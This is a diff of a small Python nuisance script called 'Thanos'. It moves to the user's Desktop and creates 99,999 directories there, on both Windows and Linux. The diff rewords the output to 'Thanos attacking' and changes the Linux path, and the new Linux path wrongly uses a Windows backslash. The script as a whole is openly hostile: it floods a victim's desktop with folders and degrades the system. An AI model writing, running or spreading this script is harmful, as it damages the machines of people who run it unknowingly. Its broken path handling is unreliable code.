@@ -5,15 +5,16 @@ if platform == "win32":
     wpath = os.path.expanduser('~')+"\Desktop"
     cd = os.chdir(wpath)
     path = os.getcwd()
-    print("Iron man founded Thanos on "+path)
+    print("Thanos attacking on "+path)
     for i in range(1,100000):
         os.mkdir("Thanos" + str(i))
-    print("Created Thanos Successfully")
+    print("Thanos attacked Successfully")
 elif platform == "linux":
     print("This system is Linux")
-    cd =os.chdir("/Desktop/")
+    wpath = os.path.expanduser('~')+"\Desktop"
+    cd =os.chdir(wpath)
     path = os.getcwd()
-    print("Iron man founded Thanos on "+path)
+    print("Thanos attacking on "+path)
     for i in range(1,100000):
         os.mkdir("Thanos" + str(i))
-    print("Created Thanos Successfully")
+    print("Thanos attacked Successfully")
